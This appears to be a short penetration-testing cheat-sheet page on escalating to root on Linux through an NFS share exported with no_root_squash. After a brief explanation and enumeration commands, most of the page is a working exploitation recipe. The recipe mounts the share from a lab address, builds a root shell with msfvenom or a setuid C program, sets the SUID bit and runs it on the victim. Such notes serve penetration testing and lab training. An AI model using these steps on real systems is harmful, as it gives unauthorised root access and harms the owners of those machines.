# No\_root\_squash option

No\_root\_squash: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.

Check /etc/exports file, if you find some directory that is configured as no\_root\_squash, then you can access it from as a client and write inside that directory as if you were the local root of the machine.&#x20;

### Enumeration

{% code overflow="wrap" %}
```bash
# linpeas will detect the no_root_squash option
./linpeas.sh

# Manual Check
cat /etc/exports
# /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)   

cat /etc/lib/nfs/etab
```
{% endcode %}

### Exploitation

{% code overflow="wrap" %}
```bash
# Check export list
showmount -e 192.168.142.154

# Mount the nfs share at kali
mkdir /tmp/nfs 
mount -o rw,vers=2 192.168.142.154:/tmp /tmp/nfs

# Create a shell
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf 

# or
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/nfs/shell.c
gcc /tmp/nfs/shell.c -o /tmp/nfs/shell.elf

# Add SUID bit
chmod +xs /tmp/nfs/shell.elf

# Run the shell on victim machine
/tmp/shell.elf  
```
{% endcode %}
